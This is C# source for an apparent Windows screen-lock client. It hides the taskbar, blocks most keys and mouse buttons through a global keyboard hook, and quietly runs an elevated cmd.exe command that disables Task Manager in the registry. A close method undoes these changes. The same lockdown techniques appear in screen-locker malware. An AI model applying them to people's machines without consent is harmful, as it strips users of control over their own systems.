using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Utilities;

namespace Client
{
    public partial class LockClient : Form
    {
        [DllImport("user32.dll")]
        private static extern int FindWindow(string className, string windowText);

        [DllImport("user32.dll")]
        private static extern int ShowWindow(int hwnd, int command);

        [DllImport("user32.dll")]
        public static extern int FindWindowEx(int parentHandle, int childAfter, string className, int windowTitle);

        [DllImport("user32.dll")]
        private static extern int GetDesktopWindow();

        private const int SW_HIDE = 0;
        private const int SW_SHOW = 1;

        globalKeyboardHook gkh = new globalKeyboardHook();

        public LockClient()
        {
            InitializeComponent();
        }

        protected static int _Handle
        {
            get
            {
                return FindWindow("Shell_TrayWnd", "");
            }
        }

        protected static int HandleOfStartButton
        {
            get
            {
                int handleOfDesktop = GetDesktopWindow();
                int handleOfStartButton = FindWindowEx(handleOfDesktop, 0, "button", 0);
                return handleOfStartButton;
            }
        }

        public static void _Show()
        {
            ShowWindow(_Handle, SW_SHOW);
            ShowWindow(HandleOfStartButton, SW_SHOW);
        }

        public static void _Hide()
        {
            ShowWindow(_Handle, SW_HIDE);
            ShowWindow(HandleOfStartButton, SW_HIDE);
        }

        private void LockClient_Load(object sender, EventArgs e)
        {
            this.ControlBox = false;
            this.Cursor = Cursors.No;
            _Hide();
            gkh.HookedKeys.Add(Keys.Alt);
            gkh.HookedKeys.Add(Keys.Tab);
            gkh.HookedKeys.Add(Keys.Space);
            gkh.HookedKeys.Add(Keys.LWin);
            gkh.HookedKeys.Add(Keys.LControlKey);
            gkh.HookedKeys.Add(Keys.Escape);
            gkh.HookedKeys.Add(Keys.LMenu);
            gkh.HookedKeys.Add(Keys.RWin);
            gkh.HookedKeys.Add(Keys.Decimal);
            gkh.HookedKeys.Add(Keys.Enter);
            gkh.HookedKeys.Add(Keys.Menu);
            gkh.HookedKeys.Add(Keys.Modifiers);
            gkh.HookedKeys.Add(Keys.Multiply);
            gkh.HookedKeys.Add(Keys.ProcessKey);
            gkh.HookedKeys.Add(Keys.RControlKey);
            gkh.HookedKeys.Add(Keys.RMenu);
            gkh.HookedKeys.Add(Keys.Packet);
            gkh.HookedKeys.Add(Keys.Delete);
            gkh.HookedKeys.Add(Keys.RButton);
            gkh.HookedKeys.Add(Keys.LButton);
            gkh.KeyDown += new KeyEventHandler(gkh_KeyDown);
            gkh.KeyUp += new KeyEventHandler(gkh_KeyUp);

            TaskManager(@"/C REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f");
        }

        public void TaskManager(string cmd)
        {

            Process p = new Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = cmd;
            p.StartInfo.Verb = "runas";
            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;

            p.Start();
        }

        void gkh_KeyUp(object sender, KeyEventArgs e)
        {
            e.Handled = true;
        }

        void gkh_KeyDown(object sender, KeyEventArgs e)
        {
            e.Handled = true;
        }


        public void close()
        {
            gkh.unhook();
            TaskManager(@"/C REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f");
            _Show();
            Close();   
        }
    }
}
